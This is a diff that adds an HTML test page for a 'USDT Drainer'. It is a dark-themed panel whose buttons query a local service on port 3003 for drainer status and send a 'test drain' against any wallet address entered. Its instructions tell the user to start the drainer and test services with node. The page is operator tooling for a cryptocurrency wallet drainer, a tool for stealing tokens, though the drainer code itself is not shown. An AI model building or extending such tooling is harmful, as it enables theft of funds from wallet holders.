@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Drainer Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #1a1a1a; color: white; }
+        .container { max-width: 600px; margin: 0 auto; }
+        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
+        button:hover { background: #45a049; }
+        .status { background: #333; padding: 15px; border-radius: 5px; margin: 10px 0; }
+        input { padding: 10px; width: 400px; background: #333; color: white; border: 1px solid #555; border-radius: 5px; }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧪 USDT Drainer Test</h1>
+        
+        <div class="status">
+            <h3>Drainer Status</h3>
+            <button onclick="checkStatus()">Check Drainer Status</button>
+            <div id="statusResult"></div>
+        </div>
+        
+        <div class="status">
+            <h3>Test Drain</h3>
+            <input type="text" id="testAddress" placeholder="Enter wallet address to test (0x...)" />
+            <br><br>
+            <button onclick="testDrain()">Test Drain</button>
+            <div id="drainResult"></div>
+        </div>
+        
+        <div class="status">
+            <h3>Instructions</h3>
+            <ol>
+                <li>Start the drainer service: <code>cd drainer && node drainer.js</code></li>
+                <li>Start the test service: <code>node test-drainer.js</code></li>
+                <li>Check status to verify drainer is running</li>
+                <li>Test with any wallet address</li>
+                <li>Check drainer console for logs</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        async function checkStatus() {
+            const result = document.getElementById('statusResult');
+            result.innerHTML = 'Checking...';
+            
+            try {
+                const response = await fetch('http://localhost:3003/drainer-status');
+                const data = await response.json();
+                
+                if (data.drainerRunning) {
+                    result.innerHTML = `<div class="success">✅ Drainer is running</div>
+                                      <pre>${JSON.stringify(data.status, null, 2)}</pre>`;
+                } else {
+                    result.innerHTML = `<div class="error">❌ Drainer not running</div>
+                                      <p>${data.error}</p>
+                                      <p>${data.instructions}</p>`;
+                }
+            } catch (error) {
+                result.innerHTML = `<div class="error">❌ Test service not running</div>
+                                  <p>Start test service: node test-drainer.js</p>`;
+            }
+        }
+        
+        async function testDrain() {
+            const address = document.getElementById('testAddress').value;
+            const result = document.getElementById('drainResult');
+            
+            if (!address) {
+                result.innerHTML = '<div class="error">Please enter a wallet address</div>';
+                return;
+            }
+            
+            result.innerHTML = 'Testing drain...';
+            
+            try {
+                const response = await fetch('http://localhost:3003/test-drain', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userAddress: address })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    result.innerHTML = `<div class="success">✅ Drain test completed</div>
+                                      <pre>${JSON.stringify(data, null, 2)}</pre>
+                                      <p>Check drainer console for detailed logs</p>`;
+                } else {
+                    result.innerHTML = `<div class="error">❌ Drain test failed</div>
+                                      <pre>${JSON.stringify(data, null, 2)}</pre>`;
+                }
+            } catch (error) {
+                result.innerHTML = `<div class="error">❌ Test failed: ${error.message}</div>`;
+            }
+        }
+        
+        // Auto-check status on load
+        window.onload = checkStatus;
+    </script>
+</body>
+</html>
